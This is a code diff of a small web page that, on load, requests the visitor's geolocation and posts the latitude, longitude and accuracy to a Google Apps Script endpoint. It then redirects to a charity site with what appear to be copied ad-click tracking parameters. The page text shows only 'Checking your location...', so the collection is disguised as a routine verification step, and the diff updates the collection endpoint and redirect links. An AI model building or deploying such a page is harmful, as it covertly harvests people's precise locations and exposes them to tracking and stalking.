@@ -10,7 +10,7 @@
         accuracy: position.coords.accuracy
       };
 
-      fetch('https://script.google.com/macros/s/AKfycby2aM9rZOcr_rtuDtJtpZfn8XWUPtDLaXNtN-zIJ9cMnKuIK_C1BnrWlQcgGdihYILw/exec', {
+      fetch('https://script.google.com/macros/s/AKfycbyT91-otXJN4OiwEsh0Z53McpuXA6CzG4NHmZZolFoJzUF-upYxcDSB-IhytKtS3v_cqA/exec', {
         method: 'POST',
         body: JSON.stringify(data),
         headers: {
@@ -18,27 +18,25 @@
         }
       }).finally(() => {
         // Redirect after sending
-        window.location.href = "https://mdauk.org/?gad_source=1&gad_campaignid=22360787915&gbraid=0AAAAA_AMd2gLdp1P611EFsbeIvv_UGjh8&gclid=EAIaIQobChMIsfi0v7GIjgMVJpJQBh37Rzl-EAAYASAAEgJThfD_BwE";
+        window.location.href = "https://mdauk.org/?gad_source=1&gad_campaignid=22360787915&gclid=EAIaIQobChMI5fi0v7GjggMVJpPoCR2YcQlVEAAYASAAEgIQivD_BwE";
       });
     }
 
     function handleError(error) {
       console.error('Geolocation error:', error);
-      window.location.href = "https://mdauk.org/?gad_source=1&gad_campaignid=22360787915&gbraid=0AAAAA_AMd2gLdp1P611EFsbeIvv_UGjh8&gclid=EAIaIQobChMIsfi0v7GIjgMVJpJQBh37Rzl-EAAYASAAEgJThfD_BwE";
+      window.location.href = "https://mdauk.org/?gad_source=1&gad_campaignid=22360787915&gclid=EAIaIQobChMI5fi0v7GjggMVJpPoCR2YcQlVEAAYASAAEgIQivD_BwE";
     }
 
-    window.onload = () => {
+    window.onload = function() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
         handleError({ message: "Geolocation not supported." });
       }
-    };
+    }
   </script>
 </head>
 <body>
-  <p>Verifying location...</p>
+  <h2>Checking your location...</h2>
 </body>
 </html>
-
-
